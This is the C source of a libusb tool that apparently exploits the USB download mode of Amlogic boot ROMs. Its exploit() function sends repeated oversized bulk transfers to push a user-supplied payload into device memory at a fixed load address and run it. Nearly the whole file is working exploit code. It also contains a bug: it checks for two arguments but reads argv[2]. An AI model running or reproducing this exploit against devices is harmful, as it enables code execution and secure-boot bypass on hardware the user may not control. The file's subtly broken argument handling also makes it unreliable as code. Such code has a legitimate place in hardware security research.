/* amlogic-usbdl - github.com/frederic/amlogic-usbdl
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include "libusb-1.0/libusb.h"

#define DEBUG	1
#define VENDOR_ID	0x1b8e
#define PRODUCT_ID	0xc003

#if DEBUG
#define dprint(args...) printf(args)
#else
#define dprint(args...)
#endif

#define LOAD_ADDR           0xfffa0000
#define REQ_WR_LARGE_MEM    0x11

libusb_device_handle *handle = NULL;

#define MAX_PAYLOAD_SIZE	0x10000
typedef struct __attribute__ ((__packed__)) dldata_s {
	u_int32_t addr;
	u_int32_t size;
    u_int32_t unk0;
    u_int32_t unk1;
	u_int8_t data[];
} dldata_t;

static int exploit(dldata_t *payload) {
	int rc, transferred, i = 0;
    uint8_t bmRequestType, bRequest = 0;
    uint16_t wValue, wIndex, wLength = 0;
    bmRequestType = 0x40;
    bRequest = REQ_WR_LARGE_MEM;
    wValue = 0x1000;
    wIndex = 0x100;
    wLength = sizeof(dldata_t);
	printf("- exploit: starting.\n");
	rc = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, (uint8_t*)payload, wLength, 0);
	if(rc <= 0) {
		printf("libusb_control_transfer : error %d\n", rc);
		fprintf(stderr, "Error libusb_control_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
wIndex += 0x10;//haaacckkkkeer
	for (i = 0; i < wIndex; i++){
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)&payload->data, wValue, &transferred, 0);
		if(rc) {
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
        dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
	}

	return rc;
}

int main(int argc, char *argv[])
{
	libusb_context *ctx;
	FILE *fd;
	dldata_t *payload;
	size_t payload_size, fd_size;
	uint8_t mode;
	int rc;

	if (argc != 2) {
		printf("Usage: %s <input_file>\n", argv[0]);
		printf("\tinput_file: payload binary to load and execute\n");
		return EXIT_SUCCESS;
	}

	fd = fopen(argv[2],"rb");
	if (fd == NULL) {
		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
		return EXIT_FAILURE;
	}

	fseek(fd, 0, SEEK_END);
	fd_size = ftell(fd);

    if(fd_size > MAX_PAYLOAD_SIZE){
        fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
        return EXIT_FAILURE;
    }
    payload_size = sizeof(dldata_t) + MAX_PAYLOAD_SIZE;


	payload = (dldata_t*)calloc(1, payload_size);
    payload->addr = LOAD_ADDR;
	payload->size = fd_size;

	fseek(fd, 0, SEEK_SET);
	payload_size = fread(&payload->data, 1, fd_size, fd);
	if (payload_size != fd_size) {
		fprintf(stderr, "Error: cannot read entire file !\n");
		return EXIT_FAILURE;
	}

	rc = libusb_init (&ctx);
	if (rc < 0)
	{
		fprintf(stderr, "Error: failed to initialise libusb: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	#if DEBUG
	//libusb_set_debug(ctx, LIBUSB_LOG_LEVEL_DEBUG);
	#endif

	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
	if (!handle) {
		fprintf(stderr, "Error: cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
		libusb_exit (NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_claim_interface(handle, 0);
	if(rc) {
		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

    exploit(payload);

	#if DEBUG
	//sleep(5);
	#endif
	libusb_release_interface(handle, 0);

	if (handle) {
		libusb_close (handle);
	}

	libusb_exit (NULL);

	return EXIT_SUCCESS;
}
